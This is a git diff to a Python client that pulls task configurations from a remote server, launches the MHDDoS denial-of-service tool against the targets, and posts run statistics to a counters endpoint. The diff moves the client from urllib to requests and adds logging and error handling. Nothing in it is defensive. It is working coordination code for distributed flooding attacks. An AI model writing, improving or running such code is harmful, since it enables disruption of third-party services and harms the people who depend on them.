@@ -4,6 +4,7 @@ import json
 import os
 
 import psutil
+import requests
 import subprocess
 import sys
 
@@ -12,7 +13,7 @@ from concurrent.futures import ThreadPoolExecutor, wait
 from logging import basicConfig, getLogger, INFO, DEBUG
 from socket import gethostname
 from time import sleep
-from urllib.request import urlopen, Request
+
 
 basicConfig(format='[%(asctime)s - %(levelname)-5s] [%(name)s]: %(message)s',
             datefmt="%H:%M:%S")
@@ -87,12 +88,18 @@ def as_mhddos_args(config, threads_limit=0):
 
 def run_mhddos(start_args: list):
     try:
-        logger.debug(f"Starting now: MHDDoS/start.py {' '.join(mhddos_args)}")
+        mhddos_cmd = f"MHDDoS/start.py {' '.join(mhddos_args)}"
+        logger.debug(f"Starting now: {mhddos_cmd}")
         subprocess.run([sys.executable, "MHDDoS/start.py", *start_args])
-        req = Request(counters)
-        req.add_header('Content-Type', 'application/json')
-        response = urlopen(req, str(json.dumps(start_args)).encode('utf-8'))
-        st = json.dumps(response.read().decode())
+        logger.debug(f"Completed: {mhddos_cmd}")
+        logger.debug(f"POST stats data to {counters} for {start_args[:2]}")
+        rs = requests.post(counters, json=start_args)
+        if rs.ok:
+            logger.debug(f"POST stats for {start_args[:2]}: OK")
+        else:
+            logger.error(f"Couldn't POST stats to {counters}. Response code: {rs.status_code}, data: {rs.text}")
+    except requests.RequestException as rex:
+        logger.error(f"POST stats results in error (connection or other timeout issue): {rex}")
     except Exception as ex:
         logger.info(f"OOPS... {start_args[:2]} -> Issue: {ex}")
 
@@ -157,7 +164,12 @@ if __name__ == '__main__':
             logger.info("Getting fresh tasks from the server!")
             try:
                 ftrs = []
-                for conf in json.loads(urlopen(url).read(), object_hook=dict_to_nt):
+                rs = requests.get(url)
+                if rs.status_code != 200:
+                    logger.error(f"Couldn't get tasks from {url}. Response status={rs.status_code}, "
+                                 f"response data={rs.text}")
+                    break
+                for conf in json.loads(rs.text, object_hook=dict_to_nt):
                     mhddos_args = as_mhddos_args(conf, threads_limit=max_threads)
                     if mhddos_args:
                         cpu_usage = psutil.cpu_percent(4)
